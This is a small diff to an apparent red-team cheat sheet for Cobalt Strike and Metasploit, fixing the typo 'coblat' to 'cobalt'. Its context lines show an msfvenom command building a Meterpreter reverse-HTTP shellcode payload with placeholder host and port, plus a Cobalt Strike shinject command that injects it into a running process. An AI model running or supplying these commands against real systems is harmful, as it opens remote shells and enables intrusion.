@@ -160,7 +160,7 @@ beacon> spawn metasploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
 ## Run msfvenom and prepare the multi/handler listener
 
-## Copy bin file to coblat strike host
+## Copy bin file to cobalt strike host
 ps
 shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
 
